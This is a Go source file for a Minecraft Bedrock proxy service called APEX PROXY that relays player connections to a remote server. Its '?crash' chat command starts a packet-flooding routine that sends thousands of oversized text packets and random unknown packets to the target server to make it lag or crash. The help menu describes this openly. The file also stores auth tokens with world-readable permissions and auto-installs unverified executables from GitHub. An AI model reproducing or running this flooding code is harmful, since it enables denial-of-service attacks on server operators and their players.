package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/kardianos/service"
	"github.com/pelletier/go-toml"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"golang.org/x/oauth2"
)

const (
	TOKEN_FILE   = "auth_token.toml"
	VERSION_FILE = "version.txt"
	LOG_FILE     = "apex_proxy.log"
	CONFIG_FILE  = "config.toml"

	// Define your GitHub repository details for auto-updating
	// Replace with your actual repository information
	GITHUB_REPO_OWNER = "huntieezz"
	GITHUB_REPO_NAME  = "-APEX-PROXY-"
	CURRENT_VERSION   = "1.0.0" // Update this when you release a new version
)

// Program represents the service
type Program struct {
	exit chan struct{}
}

func (p *Program) Start(s service.Service) error {
	p.exit = make(chan struct{})
	go p.run()
	return nil
}

func (p *Program) Stop(s service.Service) error {
	close(p.exit)
	return nil
}

func (p *Program) run() {
	// Set up logging to file
	logFile, err := os.OpenFile(LOG_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))

	// Check for updates at startup
	checkForUpdates()

	// Start the proxy
	startProxy()
}

// TokenManager handles auth token persistence
type TokenManager struct {
	sync.Mutex
	token         *oauth2.Token
	tokenFilePath string
}

func NewTokenManager(path string) *TokenManager {
	return &TokenManager{
		tokenFilePath: path,
	}
}

func (tm *TokenManager) LoadToken() (*oauth2.Token, error) {
	tm.Lock()
	defer tm.Unlock()

	// Check if we already have a token in memory
	if tm.token != nil {
		return tm.token, nil
	}

	// Try to load from file
	if _, err := os.Stat(tm.tokenFilePath); os.IsNotExist(err) {
		return nil, err
	}

	data, err := os.ReadFile(tm.tokenFilePath)
	if err != nil {
		return nil, err
	}

	var token oauth2.Token
	if err := toml.Unmarshal(data, &token); err != nil {
		return nil, err
	}

	tm.token = &token
	return tm.token, nil
}

func (tm *TokenManager) SaveToken(token *oauth2.Token) error {
	tm.Lock()
	defer tm.Unlock()

	tm.token = token

	data, err := toml.Marshal(token)
	if err != nil {
		return err
	}

	return os.WriteFile(tm.tokenFilePath, data, 0644)
}

func (tm *TokenManager) GetOrRequestToken() (*oauth2.Token, error) {
	// Try to load an existing token
	token, err := tm.LoadToken()
	if err != nil {
		// If loading fails, request a new one
		token, err = auth.RequestLiveToken()
		if err != nil {
			return nil, err
		}
		// Save the new token
		if err := tm.SaveToken(token); err != nil {
			log.Printf("Warning: Failed to save token: %v", err)
		}
	}
	return token, nil
}

// wrappedTokenSource wraps an oauth2.TokenSource to persist refreshed tokens
type wrappedTokenSource struct {
	src          oauth2.TokenSource
	tokenManager *TokenManager
}

func (w *wrappedTokenSource) Token() (*oauth2.Token, error) {
	token, err := w.src.Token()
	if err != nil {
		return nil, err
	}

	// Save the refreshed token
	if err := w.tokenManager.SaveToken(token); err != nil {
		log.Printf("Warning: Failed to save refreshed token: %v", err)
	}

	return token, nil
}

// Check GitHub for updates
func checkForUpdates() {
	log.Println("Checking for updates...")

	// Read current version
	currentVersion := CURRENT_VERSION
	if _, err := os.Stat(VERSION_FILE); !os.IsNotExist(err) {
		versionBytes, err := os.ReadFile(VERSION_FILE)
		if err == nil {
			currentVersion = strings.TrimSpace(string(versionBytes))
		}
	}

	// Make a request to the GitHub API to check for latest release
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/releases/latest",
		GITHUB_REPO_OWNER, GITHUB_REPO_NAME)

	resp, err := http.Get(url)
	if err != nil {
		log.Printf("Failed to check for updates: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Printf("Failed to check for updates, status code: %d", resp.StatusCode)
		return
	}

	var release struct {
		TagName string `json:"tag_name"`
		Assets  []struct {
			Name               string `json:"name"`
			BrowserDownloadURL string `json:"browser_download_url"`
		} `json:"assets"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		log.Printf("Failed to parse GitHub response: %v", err)
		return
	}

	// If version is newer, download the update
	if release.TagName != currentVersion {
		log.Printf("New version available: %s (current: %s)", release.TagName, currentVersion)

		// Find the correct asset to download
		var downloadURL string
		for _, asset := range release.Assets {
			if strings.HasSuffix(asset.Name, ".exe") {
				downloadURL = asset.BrowserDownloadURL
				break
			}
		}

		if downloadURL == "" {
			log.Println("No downloadable executable found in release")
			return
		}

		// Download the new version
		log.Printf("Downloading new version from %s", downloadURL)
		updateResp, err := http.Get(downloadURL)
		if err != nil {
			log.Printf("Failed to download update: %v", err)
			return
		}
		defer updateResp.Body.Close()

		// Save to a temporary file
		tempExePath := "apex_proxy.new"
		tmpFile, err := os.Create(tempExePath)
		if err != nil {
			log.Printf("Failed to create temporary file: %v", err)
			return
		}

		_, err = io.Copy(tmpFile, updateResp.Body)
		tmpFile.Close()
		if err != nil {
			log.Printf("Failed to save update: %v", err)
			return
		}

		// Get the current executable path
		exePath, err := os.Executable()
		if err != nil {
			log.Printf("Failed to get current executable path: %v", err)
			return
		}

		// Create update script
		updateScript := `@echo off
timeout /t 2 /nobreak
del "` + exePath + `"
copy "` + tempExePath + `" "` + exePath + `"
del "` + tempExePath + `"
echo ` + release.TagName + ` > "` + VERSION_FILE + `"
start "" "` + exePath + `"
del "%~f0"
`

		scriptPath := "update.bat"
		if err := os.WriteFile(scriptPath, []byte(updateScript), 0755); err != nil {
			log.Printf("Failed to create update script: %v", err)
			return
		}

		// Execute the update script
		cmd := exec.Command("cmd", "/c", scriptPath)
		cmd.Start()

		log.Println("Update script started, exiting for update...")
		os.Exit(0)
	} else {
		log.Println("No updates available. Current version:", currentVersion)
	}
}

// Start the proxy server
func startProxy() {
	config := readConfig()
	tokenManager := NewTokenManager(TOKEN_FILE)

	// Get token once at startup, with persistence
	token, err := tokenManager.GetOrRequestToken()
	if err != nil {
		panic(err)
	}

	// Create a refreshing token source that automatically updates our persistent token
	src := auth.RefreshTokenSource(token)
	wrappedSrc := &wrappedTokenSource{
		src:          src,
		tokenManager: tokenManager,
	}

	p, err := minecraft.NewForeignStatusProvider(config.Connection.RemoteAddress)
	if err != nil {
		panic(err)
	}
	listener, err := minecraft.ListenConfig{
		StatusProvider: p,
	}.Listen("raknet", config.Connection.LocalAddress)
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	log.Println("APEX PROXY started and listening on", config.Connection.LocalAddress)
	log.Println("Forwarding connections to", config.Connection.RemoteAddress)
	log.Println("Type ?help in game chat to see available commands")
	log.Println("Proxy is running in 24/7 mode with auto-update capability")

	// Main connection acceptance loop
	for {
		c, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}

		// Each connection is handled in its own goroutine
		go handleConn(c.(*minecraft.Conn), listener, config, wrappedSrc)
	}
}

func handleConn(conn *minecraft.Conn, listener *minecraft.Listener, config config, src oauth2.TokenSource) {
	log.Printf("New connection from %s", conn.RemoteAddr())

	// Connect to the remote server
	serverConn, err := minecraft.Dialer{
		TokenSource: src,
		ClientData:  conn.ClientData(),
	}.Dial("raknet", config.Connection.RemoteAddress)
	if err != nil {
		log.Printf("Failed to connect to remote server: %v", err)
		listener.Disconnect(conn, "Failed to connect to remote server: "+err.Error())
		return
	}

	// Make sure connections are closed when this handler exits
	defer serverConn.Close()

	var g sync.WaitGroup
	g.Add(2)
	go func() {
		if err := conn.StartGame(serverConn.GameData()); err != nil {
			log.Printf("Start game error: %v", err)
		}
		g.Done()
	}()
	go func() {
		if err := serverConn.DoSpawn(); err != nil {
			log.Printf("Do spawn error: %v", err)
		}
		g.Done()
	}()
	g.Wait()

	// Send welcome message
	welcomeMsg := &packet.Text{
		Message: "§c[APEX PROXY] §f-> Thanks for using APEX",
	}
	_ = conn.WritePacket(welcomeMsg)

	// Additional welcome message indicating persistent connection feature
	persistentMsg := &packet.Text{
		Message: "§c[APEX PROXY] §f-> 24/7 Proxy Mode Active",
	}
	_ = conn.WritePacket(persistentMsg)

	connClosed := make(chan struct{})

	// Client to server packet handler
	go func() {
		defer func() {
			close(connClosed)
			log.Printf("Client to server connection closed for %s", conn.RemoteAddr())
		}()

		for {
			pk, err := conn.ReadPacket()
			if err != nil {
				return
			}

			if textPk, ok := pk.(*packet.Text); ok {
				if strings.Contains(textPk.Message, "?crash") {
					log.Println("?crash command detected from", conn.RemoteAddr(), "- initiating enhanced stress test")

					notification := &packet.Text{
						Message: "§c[APEX PROXY] §f-> Crash sent.",
					}
					_ = conn.WritePacket(notification)

					go stressTest(serverConn, conn)
					continue
				} else if strings.Contains(textPk.Message, "?help") {
					sendHelpMenu(conn)
					continue
				} else if strings.Contains(textPk.Message, "?checkupdate") {
					_ = conn.WritePacket(&packet.Text{
						Message: "§c[APEX PROXY] §f-> Checking for updates...",
					})
					go func() {
						checkForUpdates()
						_ = conn.WritePacket(&packet.Text{
							Message: "§c[APEX PROXY] §f-> Update check completed. See server logs for details.",
						})
					}()
					continue
				}
			}

			if err := serverConn.WritePacket(pk); err != nil {
				var disc minecraft.DisconnectError
				if ok := errors.As(err, &disc); ok {
					_ = listener.Disconnect(conn, disc.Error())
				}
				return
			}
		}
	}()

	// Server to client packet handler
	go func() {
		for {
			select {
			case <-connClosed:
				return
			default:
				pk, err := serverConn.ReadPacket()
				if err != nil {
					var disc minecraft.DisconnectError
					if ok := errors.As(err, &disc); ok {
						_ = listener.Disconnect(conn, disc.Error())
					}
					return
				}

				if err := conn.WritePacket(pk); err != nil {
					return
				}
			}
		}
	}()
}

func sendHelpMenu(conn *minecraft.Conn) {
	messages := []string{
		"§c[APEX PROXY] §f== Available Commands ==",
		"§c[APEX PROXY] §f?help - Shows this help menu",
		"§c[APEX PROXY] §f?crash -> Initiates strong packets to the server that will make the server lag",
		"§c[APEX PROXY] §f?checkupdate -> Check for proxy updates",
	}

	for _, msg := range messages {
		helpMsg := &packet.Text{
			Message: msg,
		}
		_ = conn.WritePacket(helpMsg)
		time.Sleep(time.Millisecond * 100) // Small delay between messages
	}
}

func stressTest(serverConn *minecraft.Conn, clientConn *minecraft.Conn) {
	packetCount := 5000

	// Only send initial notification, no progress updates
	notify := func(message string) {
		msg := &packet.Text{
			Message: fmt.Sprintf("§c[APEX PROXY] §f%s", message),
		}
		_ = clientConn.WritePacket(msg)
	}

	notify("-> Initiating crash...")

	for i := 0; i < packetCount; i++ {
		switch i % 7 {
		case 0, 1, 2:
			for j := 0; j < 5; j++ {
				textPacket := &packet.Text{
					Message: createLargeString(3000 + rand.Intn(2000)),
				}
				_ = serverConn.WritePacket(textPacket)
			}

		case 3, 4:
			for j := 0; j < 10; j++ {
				unknownPacket := &packet.Unknown{
					PacketID: uint32(110 + rand.Intn(40)),
					Payload:  createRandomBytes(1500 + rand.Intn(1000)),
				}
				_ = serverConn.WritePacket(unknownPacket)
			}

		case 5, 6:
			for j := 0; j < 20; j++ {
				textPacket := &packet.Text{
					Message: fmt.Sprintf("§%d[APEX PACKET §%d] §%dTest packet #%d - %s",
						rand.Intn(9)+1,
						rand.Intn(9)+1,
						rand.Intn(9)+1,
						j,
						createLargeString(100)),
				}
				_ = serverConn.WritePacket(textPacket)
			}
		}

		if i%50 == 0 {
			time.Sleep(time.Millisecond * 10)
		}
	}

	log.Println("Stress test completed for", clientConn.RemoteAddr())
}

func createRandomBytes(length int) []byte {
	b := make([]byte, length)
	rand.Read(b)
	return b
}

func createLargeString(length int) string {
	var buffer bytes.Buffer
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"

	for i := 0; i < length; i++ {
		randomIndex := rand.Intn(len(chars))
		buffer.WriteByte(chars[randomIndex])
	}

	return buffer.String()
}

type config struct {
	Connection struct {
		LocalAddress  string
		RemoteAddress string
	}
}

func readConfig() config {
	c := config{}
	if _, err := os.Stat(CONFIG_FILE); os.IsNotExist(err) {
		f, err := os.Create(CONFIG_FILE)
		if err != nil {
			log.Fatalf("create config: %v", err)
		}
		data, err := toml.Marshal(c)
		if err != nil {
			log.Fatalf("encode default config: %v", err)
		}
		if _, err := f.Write(data); err != nil {
			log.Fatalf("write default config: %v", err)
		}
		_ = f.Close()
	}
	data, err := os.ReadFile(CONFIG_FILE)
	if err != nil {
		log.Fatalf("read config: %v", err)
	}
	if err := toml.Unmarshal(data, &c); err != nil {
		log.Fatalf("decode config: %v", err)
	}
	if c.Connection.LocalAddress == "" {
		c.Connection.LocalAddress = "0.0.0.0:19132"
	}
	if c.Connection.RemoteAddress == "" {
		log.Println("Warning: Remote address not set in config.toml")
		log.Println("Please set Connection.RemoteAddress in config.toml")
	}
	data, _ = toml.Marshal(c)
	if err := os.WriteFile(CONFIG_FILE, data, 0644); err != nil {
		log.Fatalf("write config: %v", err)
	}
	return c
}

func main() {
	svcConfig := &service.Config{
		Name:        "APEXProxyService",
		DisplayName: "APEX Minecraft Proxy",
		Description: "APEX Minecraft Proxy with 24/7 operation and auto-update",
	}

	prg := &Program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	// Check for command-line arguments
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "install":
			err = s.Install()
			if err != nil {
				log.Fatal(err)
			}
			log.Println("Service installed")
			return
		case "uninstall":
			err = s.Uninstall()
			if err != nil {
				log.Fatal(err)
			}
			log.Println("Service uninstalled")
			return
		case "start":
			err = s.Start()
			if err != nil {
				log.Fatal(err)
			}
			log.Println("Service started")
			return
		case "stop":
			err = s.Stop()
			if err != nil {
				log.Fatal(err)
			}
			log.Println("Service stopped")
			return
		}
	}

	// If running directly (not as a service)
	err = s.Run()
	if err != nil {
		log.Fatal(err)
	}
}
